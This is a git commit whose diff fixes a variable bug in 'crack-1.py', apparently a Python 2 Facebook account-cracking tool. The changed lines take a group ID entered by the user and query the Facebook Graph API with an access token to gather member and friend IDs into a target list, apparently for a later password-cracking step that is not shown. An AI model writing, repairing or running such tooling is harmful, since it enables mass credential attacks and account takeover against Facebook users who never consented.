3822cc6ccd096bb68d2872e0cf3348bbde0ba897
EmZee07 <64885015+EmZee07@users.noreply.github.com>
2020-05-17 06:39:23 +0000

    ZeDD

--- crack-1.py
+++ crack-1.py
@@ -238,7 +238,7 @@ def pilih_super():
                 print 55 * '\x1b[1;97m\xe2\x95\x90'
                 idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
                 try:
-                    r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+                    r = requests.get('https://graph.facebook.com/' + idg + '?access_token=' + toket)
                     asw = json.loads(r.text)
                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName Friend \x1b[1;91m:\x1b[1;97m ' + asw['name']
                 except KeyError:
@@ -246,7 +246,7 @@ def pilih_super():
                     raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                     super()
 
-                re = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+                re = requests.get('https://graph.facebook.com/' + idg + '/friends?access_token=' + toket)
                 s = json.loads(re.text)
                 for i in s['data']:
                     id.append(i['id'])
